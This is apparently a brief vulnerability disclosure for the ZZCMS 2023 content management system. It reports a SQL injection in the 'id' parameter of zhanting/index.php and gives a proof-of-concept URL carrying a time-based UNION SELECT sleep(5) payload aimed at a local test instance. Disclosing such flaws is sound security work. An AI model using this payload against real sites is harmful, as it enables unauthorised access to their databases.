## Supplier

```
http://www.zzcms.net/
```

## Description

```
ZZCMS 2023 is a rapid site building system, product investment template program source code, can quickly build product investment network. For example, medical investment, health products investment, cosmetics investment, agricultural investment, pregnancy and child investment, alcohol and non-staple food.

sql injection vulnerability exists
```



## POC



```
http://127.0.0.1:8888/zhanting/index.php?id=1'union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,sleep(5)+--+x&skin=
```



![image-20250117155541620](./images/zzcsm-sql-inject.asserts/image-20250117155541620.png)



